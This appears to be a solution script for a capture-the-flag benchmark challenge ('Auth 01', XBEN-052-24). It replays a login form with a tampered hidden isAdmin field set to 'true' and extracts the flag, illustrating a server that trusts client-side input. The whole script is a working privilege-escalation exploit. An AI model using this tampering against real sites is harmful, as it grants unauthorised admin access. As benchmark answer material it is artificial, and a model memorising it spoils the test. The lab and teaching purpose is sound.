#!/usr/bin/env bash
# XBEN-052-24 — "Auth 01" (tags: business_logic, privilege_escalation)
#
# The login form carries `<input type="hidden" name="isAdmin" value="false">`
# and the server believes it. The username and password are never checked at
# all: the only test is `$_POST['isAdmin'] == "true"`.
#
# Hidden is a rendering instruction, not a security property, and this is the
# shortest demonstration of that. h5i sends the form the page describes with one
# field changed.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben052-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null
REPLAY="$("$H5I" websec replay req_0 --create \
    --set 'method=POST' \
    --set 'form.username=anyone' \
    --set 'form.password=anything' \
    --set 'form.isAdmin=true' \
    --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
